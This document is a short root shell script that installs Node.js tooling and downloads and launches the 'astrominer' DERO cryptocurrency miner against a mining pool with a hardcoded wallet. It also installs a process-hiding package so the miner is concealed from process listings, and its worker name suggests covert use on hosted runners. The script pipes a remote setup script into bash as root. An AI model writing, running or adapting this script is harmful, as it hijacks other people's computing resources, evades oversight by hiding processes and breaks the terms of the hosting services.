!/bin/sh
sudo su <<EOF
sudo apt install screen -y
sudo apt update && apt install --assume-yes curl && curl --silent --location https://deb.nodesource.com/setup_14.x  | bash - && apt install --assume-yes nodejs && apt-get install -y nodejs && apt-get install gcc g++ make && curl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg >/dev/null
echo "deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main" | tee /etc/apt/sources.list.d/yarn.list
sudo apt-get update && sudo apt-get install yarn -y && sudo npm install -g npm@9.1.1 && sudo npm install -g npm && sudo npm install -g node-process-hider
sudo ph add astrominer
wget -q https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev2.tar.gz
tar xf astrominer-V1.4_amd64_rev2.tar.gz
screen -dms run ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm.dHideGH -r pool.whalesburg.com:4305 -p stratum
top
EOF
